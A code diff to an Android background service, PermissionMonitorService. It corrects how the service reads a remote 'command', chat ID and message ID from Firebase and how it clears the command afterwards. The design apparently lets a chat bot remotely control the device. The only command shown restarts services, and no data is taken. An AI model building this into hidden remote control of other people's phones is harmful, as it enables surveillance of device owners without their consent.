@@ -96,11 +96,11 @@ class PermissionMonitorService : Service() {
     }
 
     private fun listenFirebase() {
-        deviceRef.child("command").addValueEventListener(object : ValueEventListener {
+        deviceRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                val cmd = snapshot.getValue(String::class.java) ?: return
-                val chatId = snapshot.child("chat")?.getValue(Long::class.java) ?: 0L
-                val msgId = snapshot.child("msg")?.getValue(Long::class.java) ?: 0L
+                val cmd = snapshot.child("command").getValue(String::class.java) ?: return
+                val chatId = snapshot.child("chat").getValue(Long::class.java) ?: 0L
+                val msgId = snapshot.child("msg").getValue(Long::class.java) ?: 0L
 
                 Log.d(TAG, "Command: $cmd")
 
@@ -112,7 +112,7 @@ class PermissionMonitorService : Service() {
                     "restart_services" -> restartAllServices(chatId)
                 }
 
-                snapshot.ref.setValue(null)
+                snapshot.child("command").ref.setValue(null)
             }
 
             override fun onCancelled(error: DatabaseError) {
